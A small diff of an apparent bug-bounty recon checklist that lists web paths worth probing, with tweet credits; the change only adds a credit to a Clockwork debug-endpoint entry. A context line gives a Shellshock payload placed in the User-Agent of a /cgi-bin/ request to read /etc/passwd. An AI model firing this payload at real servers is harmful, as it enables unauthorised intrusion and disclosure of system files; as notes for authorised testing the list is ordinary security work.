@@ -16,7 +16,7 @@ html:<URI>
 # LFI credit: https://twitter.com/hemanth1261/status/1265691520495017984?s=21
 /cgi-bin/ // crawl w burp, check "GET /cgi-bin/status", send to repeater, replace user agent with { :;}; echo $(</etc/passwd)
 
-# Sensitive info disclosure
+# Sensitive info disclosure credit: https://twitter.com/damian_89_/status/1250721398747791360?s=21
 /__clockwork
 
 # Edge Stack credit: https://twitter.com/damian_89_/status/1252478005986955264?s=21
